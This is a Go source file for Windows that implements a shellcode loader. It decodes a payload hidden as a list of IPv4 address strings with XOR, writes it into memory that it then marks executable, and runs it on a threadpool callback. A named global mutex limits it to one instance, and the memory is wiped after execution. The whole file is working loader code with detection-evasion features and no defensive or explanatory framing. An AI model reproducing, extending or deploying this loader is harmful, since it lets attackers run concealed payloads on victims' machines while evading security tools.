const (
	mutexNameDefault = "Global\\blobx1Mu"
	waitTimeoutMs    = 180000
	waitObject0      = 0
)

var (
	kernel32                        = syscall.NewLazyDLL("kernel32.dll")
	procTrySubmitThreadpoolCallback = kernel32.NewProc("TrySubmitThreadpoolCallback")
)

type payCtx struct {
	sc    []byte
	entry uint32
	done  windows.Handle
}

var pendingCtxs = struct {
	sync.Mutex
	set map[*payCtx]struct{}
}{set: make(map[*payCtx]struct{})}

func keepCtx(ctx *payCtx) {
	pendingCtxs.Lock()
	pendingCtxs.set[ctx] = struct{}{}
	pendingCtxs.Unlock()
}

func dropCtx(ctx *payCtx) {
	pendingCtxs.Lock()
	delete(pendingCtxs.set, ctx)
	pendingCtxs.Unlock()
}

func RunSafe(sc []byte, entryRva uint32) {
	runSafe(sc, entryRva, mutexNameDefault)
}

func runSafe(sc []byte, entryRva uint32, mutexName string) {
	ctx := submitSafe(sc, entryRva, mutexName)
	if ctx == nil {
		return
	}
	syscall.WaitForSingleObject(syscall.Handle(ctx.done), waitTimeoutMs)
	runtime.KeepAlive(ctx)
	syscall.CloseHandle(syscall.Handle(ctx.done))
}

func runSafeAsync(sc []byte, entryRva uint32, mutexName string) {
	ctx := submitSafe(sc, entryRva, mutexName)
	if ctx == nil {
		return
	}
	keepCtx(ctx)
}

func submitSafe(sc []byte, entryRva uint32, mutexName string) *payCtx {
	if len(sc) == 0 {
		return nil
	}

	namePtr, err := syscall.UTF16PtrFromString(mutexName)
	if err != nil {
		return nil
	}
	hMutex, err := windows.CreateMutex(nil, false, namePtr)
	if err != nil && err != windows.ERROR_ALREADY_EXISTS {
		return nil
	}
	defer syscall.CloseHandle(syscall.Handle(hMutex))

	r, err := syscall.WaitForSingleObject(syscall.Handle(hMutex), 0)
	if err != nil || r != waitObject0 {
		return nil
	}
	defer windows.ReleaseMutex(hMutex)

	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return nil
	}

	ctx := &payCtx{sc: sc, entry: entryRva, done: hEvent}
	cb := syscall.NewCallback(threadpoolWorker)
	ok, _, _ := procTrySubmitThreadpoolCallback.Call(cb, uintptr(unsafe.Pointer(ctx)), 0)
	if ok == 0 {
		syscall.CloseHandle(syscall.Handle(hEvent))
		return nil
	}
	return ctx
}

func threadpoolWorker(instance, context uintptr) uintptr {
	ctx := *(**payCtx)(unsafe.Pointer(&context))
	if addr := allocAndWriteBlob(ctx.sc); addr != 0 {
		runPayAt(addr, len(ctx.sc), ctx.entry, true)
	}
	windows.SetEvent(ctx.done)
	dropCtx(ctx)
	return 0
}

func allocAndWriteBlob(sc []byte) uintptr {
	if len(sc) == 0 {
		return 0
	}
	p, err := windows.VirtualAlloc(0, uintptr(len(sc)), windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		return 0
	}
	dst := (*[1 << 30]byte)(*(*unsafe.Pointer)(unsafe.Pointer(&p)))[:len(sc):len(sc)]
	copy(dst, sc)
	var old uint32
	windows.VirtualProtect(p, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &old)
	return p
}

func runPayAt(addr uintptr, size int, entryRva uint32, owned bool) {
	syscall.SyscallN(addr + uintptr(entryRva))
	if owned {
		secureZeroMemory(addr, size)
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	}
}

func secureZeroMemory(addr uintptr, size int) {
	if size <= 0 {
		return
	}
	dst := (*[1 << 30]byte)(*(*unsafe.Pointer)(unsafe.Pointer(&addr)))[:size:size]
	for i := range dst {
		dst[i] = 0
	}
}

func DeIPs(ips []string, key []byte) []byte {
	if len(ips) == 0 || len(key) == 0 {
		return nil
	}
	out := make([]byte, len(ips)*4)
	for i, s := range ips {
		var b [4]byte
		if n, err := fmt.Sscanf(s, "%d.%d.%d.%d", &b[0], &b[1], &b[2], &b[3]); err != nil || n != 4 {
			return nil
		}
		for j := 0; j < 4; j++ {
			idx := i*4 + j
			if idx >= len(out) {
				break
			}
			out[idx] = b[j] ^ key[idx%len(key)] ^ byte(idx&0xFF)
		}
	}
	return out
}

